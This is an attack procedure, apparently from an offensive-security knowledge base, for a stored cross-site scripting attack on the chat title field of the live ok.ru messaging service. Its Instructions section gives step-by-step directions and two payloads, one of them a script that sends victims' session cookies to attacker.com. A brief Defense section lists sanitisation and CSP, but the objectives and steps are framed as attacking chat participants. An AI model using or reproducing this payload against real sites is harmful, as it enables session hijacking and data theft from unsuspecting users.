---
id: proc-inject-payload-okru-chat
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.390Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-okru-Chat-Title

## Summary

This procedure exploits insufficient input validation in the ok.ru personal messages chat title field to store a malicious JavaScript payload, setting up a Stored XSS attack that affects viewers of the chat.

## Description

The ok.ru messaging system at https://ok.ru/messages allows users to set custom titles for personal chats. Due to lack of sanitization, user-supplied input in the title is stored in the backend and rendered directly in the HTML of the messages page without escaping. An attacker with an ok.ru account can inject a script tag or other JavaScript, which persists and executes when any participant views the chat. This is particularly dangerous in social contexts where victims are likely to open messages from known contacts. Prerequisites include a valid account and basic knowledge of JavaScript payloads for effects like cookie theft.

## Requirements

1. Valid ok.ru user account with messaging access.
2. Web browser to interact with the site.
3. Knowledge of XSS payloads (e.g., for testing or exploitation).

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for all user-controlled fields, using libraries like DOMPurify.
- Content Security Policy (CSP) to restrict inline script execution.
- Monitor for anomalous JavaScript network requests from the ok.ru domain.

## Objectives

1. Store unsanitized malicious JavaScript in the chat title.
2. Prepare for execution in victim browsers.
3. Enable follow-on attacks like data exfiltration.

## Instructions

### Step 1: Access Personal Messages

**Context**: Log in to ok.ru and navigate to the messaging interface to create or edit a chat.

Open https://ok.ru/messages in your browser and start a new personal message to a target user or yourself for testing.

> Ensure you are authenticated; the site uses session cookies for state.

### Step 2: Inject Payload

**Context**: Enter the malicious payload in the chat title field to bypass sanitization.

In the chat title input, enter a payload such as:

```html
<script>alert('Stored XSS in ok.ru');</script>
```

Or for exfiltration:

```html
<script>fetch('http://attacker.com/log?data=' + encodeURIComponent(document.cookie));</script>
```

Submit the chat creation or update.

> The payload is stored server-side and will be reflected in the title element when the messages page loads.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored without modification.

Refresh the messages page or view the chat list. Inspect the HTML source (right-click > Inspect) for the title element containing the raw script tag.

> Successful storage shows the script unescaped in the DOM, ready for execution on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
- [[JavaScript]]
